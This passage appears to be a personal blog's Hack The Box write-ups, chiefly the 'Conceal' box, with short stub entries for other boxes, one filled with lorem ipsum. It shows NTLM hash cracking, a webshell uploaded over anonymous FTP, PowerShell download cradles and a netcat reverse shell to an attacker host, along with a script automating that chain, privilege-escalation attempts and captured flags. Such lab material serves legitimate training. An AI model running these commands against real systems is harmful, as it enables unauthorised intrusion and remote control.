  127.0.0.1             1900\n    127.0.0.1             50999\n\n  [*] Processes:\n    Id                    Status                Name                  Path                  Parameters\n    1                     running               System Idle Process\n    4                     running               System\n    60                    running               svchost.exe           C:\\Windows\\System32\\  -k NetworkService\n    68                    running               svchost.exe           C:\\Windows\\System32\\  -k LocalSystemNetworkRestricted\n    288                   running               smss.exe\n    328                   running               svchost.exe           C:\\Windows\\system32\\  -k LocalService\n    380                   running               csrss.exe\n    464                   running               wininit.exe\n    472                   running               csrss.exe\n    528                   running               winlogon.exe\n    608                   running               services.exe\n    616                   running               lsass.exe             C:\\Windows\\system32\\\n    668                   running               svchost.exe           C:\\Windows\\system32\\  -k LocalServiceNoNetwork\n    704                   running               svchost.exe           C:\\Windows\\system32\\  -k DcomLaunch\n    732                   running               fontdrvhost.exe\n    736                   running               fontdrvhost.exe\n    828                   running               svchost.exe           C:\\Windows\\system32\\  -k RPCSS\n    920                   running               dwm.exe\n    944                   running               svchost.exe           C:\\Windows\\system32\\  -k netsvcs\n    980                   running               svchost.exe           C:\\Windows\\System32\\  -k LocalServiceNetworkRestricted\n    1116                  running               vmacthlp.exe          C:\\Program Files\\VMware\\VMware Tools\\\n    1212                  running               Memory Compression\n    1348                  running               svchost.exe           C:\\Windows\\System32\\  -k LocalServiceNetworkRestricted\n    1420                  running               svchost.exe           C:\\Windows\\System32\\  -k LocalServiceNetworkRestricted\n    1436                  running               svchost.exe           C:\\Windows\\system32\\  -k LocalServiceNetworkRestricted\n    1504                  running               spoolsv.exe           C:\\Windows\\System32\\\n    1672                  running               svchost.exe           C:\\Windows\\system32\\  -k appmodel\n    1688                  running               LogonUI.exe                                 /flags:0x0 /state0:0xa3a9a055 /state1:0x41c64e6d\n    1700                  running               svchost.exe           C:\\Windows\\system32\\  -k apphost\n    1720                  running               svchost.exe           C:\\Windows\\System32\\  -k utcsvc\n    1736                  running               svchost.exe           C:\\Windows\\system32\\  -k ftpsvc\n    1816                  running               SecurityHealthService.exe\n    1828                  running               snmp.exe              C:\\Windows\\System32\\\n    1892                  running               svchost.exe           C:\\Windows\\system32\\  -k iissvcs\n    1928                  running               MsMpEng.exe\n    1936                  running               VGAuthService.exe     C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\\n    1952                  running               vmtoolsd.exe          C:\\Program Files\\VMware\\VMware Tools\\\n    2000                  running               ManagementAgentHost.exe  C:\\Program Files\\VMware\\VMware Tools\\VMware CAF\\pme\\bin\\\n    2628                  running               svchost.exe           C:\\Windows\\system32\\  -k NetworkServiceNetworkRestricted\n    2768                  running               SearchIndexer.exe     C:\\Windows\\system32\\  /Embedding\n    2896                  running               WmiPrvSE.exe          C:\\Windows\\system32\\wbem\\\n    3036                  running               dllhost.exe           C:\\Windows\\system32\\  /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}\n    3204                  running               msdtc.exe             C:\\Windows\\System32\\\n    3528                  running               NisSrv.exe\n    3696                  running               svchost.exe           C:\\Windows\\system32\\  -k LocalSystemNetworkRestricted\n    4076                  running               svchost.exe           C:\\Windows\\system32\\  -k LocalServiceAndNoImpersonation\n\nWe get a lot of interesting data;\n- IKE VPN PSK: 9C8B1A372B1878851BE2C097031B6E43 (Dudecake1!)\n- Usernames; Destitute, Administrator\n- A lot of listening TCP- and UDP-ports.\n\n\n3. The hash looks like md5, but trying to crack it with hashcat and wordlist rockyou.txt gives nothing.\nUsing hash-identifier we get the option of 'NTLM', and sure enough trying that gives us a password.\n\n[root:/git/htb/conceal]# hash-identifier\n  --- snip ---\n   HASH: 9C8B1A372B1878851BE2C097031B6E43\n\n  Possible Hashs:\n  [+] MD5\n  [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\n\n  Least Possible Hashs:\n  [+] RAdmin v2.x\n  [+] NTLM\n\n\n[root:/git/htb/conceal]# hashcat -a0 -m1000 '9C8B1A372B1878851BE2C097031B6E43' /usr/share/wordlists/rockyou.txt\n  --- snip ---\n  9c8b1a372b1878851be2c097031b6e43:Dudecake1!\n\nUsing ike-scan we can verify if they're running in aggressive or main mode. If aggressive mode, we can easily\nbrute force the group ID, and later a password hash to gain access.\n\nAggressive test:\n[root:/git/htb/conceal]# ike-scan -M -A 10.10.10.116 --id=test --sport=5001                                                       (master✱)\n  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n\n  Ending ike-scan 1.9.4: 1 hosts scanned in 2.438 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify\n\nMain test:\n[root:/git/htb/conceal]# ike-scan -M 10.10.10.116 --sport=5001                                                          (master✱)\n  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n  10.10.10.116  Main Mode Handshake returned\n    HDR=(CKY-R=f2741f0361c9dbfa)\n    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)\n    VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)\n    VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)\n    VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\\n)\n    VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)\n    VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)\n    VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)\n\n  Ending ike-scan 1.9.4: 1 hosts scanned in 0.064 seconds (15.72 hosts/sec).  1 returned handshake; 0 returned notify\n\nHowever they are running main mode, making it all that much harder.\n\n\n4. With the information we have gathered, configure strongswan to setup our IPSec connection.\n\nEdit '/etc/ipsec.secrets' and add the PSK at the bottom;\n[root:/git/htb/conceal]# cat /etc/ipsec.secrets                                                                                   (master✱)\n  --- snip ---\n  10.10.10.116 : PSK \"Dudecake1!\"\n\nSetup a new connection in '/etc/ipsec.conf';\n[root:/git/htb/conceal]# cat /etc/ipsec.conf                                                                                      (master✱)\n  --- snip ---\n  conn Conceal\n    type=transport\n    auto=start\n    keyexchange=ikev1\n    authby=psk\n    right=10.10.10.116\n    ike=3des-sha1-modp1024\n    esp=3des-sha1\n    rightprotoport=tcp\n    leftprotoport=tcp\n\n[root:/git/htb/conceal]# ipsec start                                                                                              (master✱)\n  Starting strongSwan 5.9.1 IPsec [starter]...\n[root:/git/htb/conceal]# ipsec status                                                                                             (master✱)\n  Security Associations (1 up, 0 connecting):\n       Conceal[1]: ESTABLISHED 4 seconds ago, 10.10.14.11[10.10.14.11]...10.10.10.116[10.10.10.116]\n       Conceal{1}:  INSTALLED, TRANSPORT, reqid 1, ESP SPIs: cddc16ac_i 19a4e0d0_o\n       Conceal{1}:   10.10.14.11/32 === 10.10.10.116/32[tcp]\n\nNOTE: Troubleshooting can be done by adding the --nofork flag, ex. 'ipsec start --nofork'\n\n\n5. Now when connected, we can scan the device and get a satisfactory result. We found all open TCP ports earlier using\nsmnp-check, scan them again with nmap (flag -sT needed else everything shows as filtered).\n\n[root:/opt/ikeforce]# nmap -sT -sVC 10.10.10.116 -p21,80,135,445,49664,49665,49666,49667,49668,49669,49670,139                     (master)\n  PORT      STATE SERVICE       VERSION\n  21/tcp    open  ftp           Microsoft ftpd\n  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n  | ftp-syst:\n  |_  SYST: Windows_NT\n  80/tcp    open  http          Microsoft IIS httpd 10.0\n  | http-methods:\n  |_  Potentially risky methods: TRACE\n  |_http-server-header: Microsoft-IIS/10.0\n  |_http-title: IIS Windows\n  135/tcp   open  msrpc         Microsoft Windows RPC\n  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n  445/tcp   open  microsoft-ds?\n  49664/tcp open  msrpc         Microsoft Windows RPC\n  49665/tcp open  msrpc         Microsoft Windows RPC\n  49666/tcp open  msrpc         Microsoft Windows RPC\n  49667/tcp open  msrpc         Microsoft Windows RPC\n  49668/tcp open  msrpc         Microsoft Windows RPC\n  49669/tcp open  msrpc         Microsoft Windows RPC\n  49670/tcp open  msrpc         Microsoft Windows RPC\n  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n  Host script results:\n  |_clock-skew: 6m23s\n  | smb2-security-mode:\n  |   2.02:\n  |_    Message signing enabled but not required\n  | smb2-time:\n  |   date: 2021-03-23T15:23:09\n  |_  start_date: 2021-03-23T09:41:08\n\nDIRB:\n  ---- Scanning URL: http://10.10.10.116/ ----\n  ==&gt; DIRECTORY: http://10.10.10.116/upload/\n\n\n6. We got anonymous login to the FTP server, and can put files on the share. From dirb we found a 'upload' directory,\nmeaning we can probably upload a shell on the FTP-server, and trigger it through the URL.\n\nSeems like we can upload most files, however file bigger then 1100 seem to get stuck in upload.\nNone of .aspx, .php, .py, .war, .exe, .jsp seem to work. I went with a minimal (size 1099) .asp webshell that worked.\n\nFrom the webshell we can grab user.txt (called proof.txt in this box)\n\nftp&gt; open 10.10.10.116\n  Connected to 10.10.10.116.\n  220 Microsoft FTP Service\n  Name (10.10.10.116:root): anonymous\n  331 Anonymous access allowed, send identity (e-mail name) as password.\n  Password:\n  230 User logged in.\n  Remote system type is Windows_NT.\nftp&gt; put webshell.asp\n\nBrowse: http://10.10.10.116/upload/webshell.asp\n\nEnter: type C:\\Users\\Destitute\\Desktop\\proof.txt\nor\nURL: http://10.10.10.116/upload/webshell.asp?cmd=type+C%3A%5CUsers%5CDestitute%5CDesktop%5Cproof.txt\n\nThe server's local address:\n10.10.10.116 6E9FDFE0DCB66E700FB9CB824AE5A6FF\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n\n   ██████╗  ██████╗  ██████╗ ████████╗\n   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝\n   ██████╔╝██║   ██║██║   ██║   ██║\n   ██╔══██╗██║   ██║██║   ██║   ██║\n   ██║  ██║╚██████╔╝╚██████╔╝   ██║\n   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝\n\n\n1. To get a reverse shell has been very very annoying. I tried everything from one-liners to trigger powershell scripts\nover a python3 hosted http.server, trigger executables over smb and more - but all failed, even though the victim\nfetched the vulnerable file/scripts.\n\nThe solution was primal:\n  a. Setup local python3 http.server in a directory containing nc64.exe\n  b. Setup your nc listener\n  c. Upload a webshell through the anonymous FTP\n  d. Quickly create C:\\tmp before webshell is deleted\n  e. Quickly upload nc64.exe to C:\\tmp\n  f. Even faster execute a reverse connection from C:\\tmp\\nc64.exe before BOTH webshell and nc64.exe is deleted\n  g. Grab shell and profit\n\nWEBSHELL: mkdir C:\\tmp\n\n[root:/opt/shells/asp]# python3 -m http.server 8080\n  Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n  10.10.10.116 - - [24/Mar/2021 12:23:48] \"GET /nc64.exe HTTP/1.1\" 200 -\n\nWEBSHELL: powershell Invoke-WebRequest -Uri \"http://10.10.14.11:8080/nc64.exe\" -OutFile \"C:\\tmp\\nc64.exe\"\nWEBSHELL: powershell -c \"C:\\tmp\\nc64.exe 10.10.14.11 4488 -c cmd\"\n\n[root:/git/htb/conceal]# nc -lvnp 4488                                                                                            (master✱)\n  listening on [any] 4488 ...\n  connect to [10.10.14.11] from (UNKNOWN) [10.10.10.116] 49705\n  Microsoft Windows [Version 10.0.15063]\n  (c) 2017 Microsoft Corporation. All rights reserved.\n\n  C:\\Windows\\SysWOW64\\inetsrv&gt;\n\n\nThis whole process can also be automated if one would want to make a script. For this I made a real quick and dirty\nbash script, curl-rev.sh, as a poc.\n\n[root:/git/htb/conceal]# cat curl-rev.sh                                                                                          (master✱)\n  #!/bin/bash\n\n  ### IMPORTANT! ###\n  # Before you run the script, make sure to setup:\n  # python -m http.server 8080 (in a folder where nc64.exe exists)\n  # rlwrap nc -lvnp 4488\n\n  # Upload Webshell\n  curl --user anonymous:anonymous --upload-file /opt/shells/asp/webshell.asp ftp://conceal.htb/\n\n  # Upload nc64.exe and executes reverse:\n  # mkdir C:\\tmp\n  # powershell Invoke-WebRequest -Uri \"http://10.10.14.11:8080/nc64.exe\" -OutFile \"C:\\tmp\\nc64.exe\"\n  # C:\\tmp\\nc64.exe 10.10.14.11 4488 -e cmd\n  curl http://conceal.htb/upload/webshell.asp\\?cmd\\=mkdir%20C%3A%5Ctmp\n  curl http://conceal.htb/upload/webshell.asp\\?cmd\\=powershell%20Invoke-WebRequest%20-Uri%20%22http%3A%2F%2F10.10.14.11%3A8080%2Fnc64.exe%22%20-OutFile%20%22C%3A%5Ctmp%5Cnc64.exe%22\n  sleep 1\n  curl http://conceal.htb/upload/webshell.asp\\?cmd\\=C%3A%5Ctmp%5Cnc64.exe%2010.10.14.11%204488%20-e%20cmd\n  echo \"done!\"\n\n\n2. Enumerate the box! Look a groups, privs, and see if there are any obviously suspicious files.\n\nC:\\tmp&gt;whoami /all\n  --- snip ---\n  Everyone                             Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group\n  BUILTIN\\Users                        Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group\n  NT AUTHORITY\\BATCH                   Well-known group S-1-5-3                                                                                          Mandatory group, Enabled by default, Enabled group\n  CONSOLE LOGON                        Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group\n  NT AUTHORITY\\Authenticated Users     Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group\n  NT AUTHORITY\\This Organization       Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group\n  NT AUTHORITY\\Local account           Well-known group S-1-5-113                                                                                        Mandatory group, Enabled by default, Enabled group\n  BUILTIN\\IIS_IUSRS                    Alias            S-1-5-32-568                                                                                     Mandatory group, Enabled by default, Enabled group\n  LOCAL                                Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group\n  IIS APPPOOL\\DefaultAppPool           Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415                                    Mandatory group, Enabled by default, Enabled group\n  NT AUTHORITY\\NTLM Authentication     Well-known group S-1-5-64-10                                                                                      Mandatory group, Enabled by default, Enabled group\n                                       Unknown SID type S-1-5-32-4028125388-2803578072-1053907958-341417128-2434011155-477421480-740873757-3973419746    Mandatory group, Enabled by default, Enabled group\n                                       Unknown SID type S-1-5-32-2745667521-2937320506-1424439867-4164262144-2333007343-2599685697-2993844191-2003921822 Mandatory group, Enabled by default, Enabled group\n                                       Unknown SID type S-1-5-32-1034403361-4122601751-838272506-684212390-1217345422-475792769-1698384238-1075311541    Mandatory group, Enabled by default, Enabled group\n  Mandatory Label\\High Mandatory Level Label            S-1-16-12288\n\n  --- snip ---\n  Privilege Name                Description                               State\n  ============================= ========================================= ========\n  SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\n  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\n  SeShutdownPrivilege           Shut down the system                      Disabled\n  SeAuditPrivilege              Generate security audits                  Disabled\n  SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\n  SeUndockPrivilege             Remove computer from docking station      Disabled\n  SeImpersonatePrivilege        Impersonate a client after authentication Enabled\n  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n  SeTimeZonePrivilege           Change the time zone                      Disabled\n\nGroups looks pretty normal, nothing really going on there.\nWe can see from the privs that we have 'SeImpersonatePrivilege', maybe we can use JuicyPotato?\n\n\n3. Trying to execute JuicyPotato unfortunately locally and remotely triggers the AV;\nC:\\Users\\Destitute\\Documents&gt; powershell Invoke-WebRequest -Uri \"http://10.10.14.11:8080/JuicyPotato.exe\" -OutFile jp.exe\nC:\\Users\\Destitute\\Documents&gt; powershell -c \"C:\\Users\\Destitute\\Documents\\jp.exe -l 1444 -p c:\\tmp\\nc64.exe -a \"10.10.14.11 4499 -e cmd\" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}\"\n  --- snip ---\n  Program 'jp.exe' failed to run: Operation did not complete successfully because the file contains a virus or\n  potentially unwanted software\n\nWe can't even setup a new reverse Powershell shell with Nishang's Invoke-PowerShellTcp without the AV complaining;\nC:\\Users\\Destitute\\Documents&gt; powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11:8080/Invoke-PowerShellTcp.ps1')\n  --- snip ---\n  This script contains malicious content and has been blocked by your antivirus software.\n\n\nSeems like we need to look for another privesc.\n\n\n4. Grab systeminfo and throw it to windows-exploit-suggester.\n\n[root:/git/htb/conceal]# python /opt/windows-exploit-suggester.py --update                                                        (master✱)\n[root:/git/htb/conceal]# python /opt/windows-exploit-suggester.py --database 2021-03-25-mssb.xls --systeminfo systeminfo.txt\n  [*] initiating winsploit version 3.3...\n  [*] database file detected as xls or xlsx based on extension\n  [*] attempting to read from the systeminfo input file\n  [+] systeminfo input file read successfully (ascii)\n  [*] querying database file for potential vulnerabilities\n  [*] comparing the 0 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits\n  [*] there are now 160 remaining vulns\n  [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n  [+] windows version identified as 'Windows 10 64-bit'\n  [*]\n  [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important\n  [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)\n  [*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)\n  [*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255\n  [*]\n  [E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical\n  [*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution\n  [*]   https://github.com/theori-io/chakra-2016-11\n  [*]\n  [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important\n  [*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)\n  [*]\n  [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important\n  [*]   https://github.com/foxglovesec/RottenPotato\n  [*]   https://github.com/Kevin-Robertson/Tater\n  [*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege\n  [*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation\n  [*]\n  [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important\n  [*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC\n  [*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC\n  [*]\n  [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical\n  [*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC\n  [*]\n  [E] MS16-056: Security Update for Windows Journal (3156761) - Critical\n  [*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)\n  [*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption\n  [*]\n  [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important\n  [*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF\n  [*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC\n  [*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC\n  [*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)\n  [*]\n  [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important\n  [*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF\n  [*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC\n  [*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC\n  [*]\n  [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important\n  [*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC\n  [*]\n  [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important\n  [*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC\n  [*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC\n  [*]\n  [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important\n  [*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC\n  [*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC\n  [*]\n  [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical\n  [*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)\n  [*]\n  [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important\n  [*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC\n  [*]\n  [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important\n  [*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC\n  [*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC\n  [*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC\n  [*]\n  [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical\n  [*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC\n  [*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC\n  [*]\n  [*] done\n\n\nMS16-135:\nC:\\Users\\Destitute\\Documents&gt; powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11:8080/MS16-135.ps1')\n  --- snip ---\n  This script contains malicious content and has been blocked by your antivirus software.\n\nC:\\Users\\Destitute\\Documents&gt; //10.10.14.11/share/41015.exe\n  The request is not supported.\n\n\nMS16-032:\nOpens a new console, so only applicable when you have a RDP session.\n\nMS16-016:\nOpens a new console, so only applicable when you have a RDP session.\n\n\nNone of the above exploits seem to work. Out of frustration I went ahead an looked on a walkthrough, and sure enough\nJuicyPotato was the way to root. Since we can't get it to work, here's the free root.txt:\n\n5737DD2EDC29B5B219BC43E60866BE08\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n\n   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗\n   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║\n   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║\n   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║\n   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║\n   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝\n\nSNMP Enum:\n  https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp\n\nIKE Enum:\n  https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting\n\nStrongswan:\n  https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection\n  https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/\n\nASP Webshell:\n  https://github.com/tennc/webshell/blob/master/asp/webshell.asp\n\nPowershell Reverse:\n  https://github.com/samratashok/nishang/tree/master/Shells\n\nJuicyPotato CLSID:\n  http://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/"
  },
  {
    "objectID": "posts/2019-05-08-htb-writeup-bastion/2019-05-08-htb-writeup-bastion.html",
    "href": "posts/2019-05-08-htb-writeup-bastion/2019-05-08-htb-writeup-bastion.html",
    "title": "Bastion - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2021-09-14-htb-writeup-ai/2021-09-14-htb-writeup-ai.html",
    "href": "posts/2021-09-14-htb-writeup-ai/2021-09-14-htb-writeup-ai.html",
    "title": "Ai - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n ai.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA) | 256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA) |_ 256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Hello AI! Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nnmap -Pn -sV -n -p- ai.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nnmap -Pn -sV -n -sU ai.htb PORT STATE SERVICE VERSION 5353/udp open|filtered zeroconf\n\nEnum with Dirb and Nikto, also dirb -X .php for php-extensions .. http://ai.htb/uploads/ .. /db.php: This might be interesting… has been seen in web logs from an unknown scanner. .. /intelligence.php\nLooking at site we find a uploader on http://ai.htb/ai.php, this is promising towards initial foothold. /intelligence.php hints us on how to use it, install festival and use it’s text2wave to send input to the AI. Let’s try a test string “Say hi python” to see if the AI understands the input and gives us correct query result.\nroot@p3:/opt/htb/machines/ai# echo “Say Hi Python” | text2wave -o Hi-Python.wav\nUpload the file, Process It and this is the result: Our Understanding of your input is : say hi python Query result : print(“hi”)\n\nSo far so good. Lets see if we can enumerate using TTS.\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ 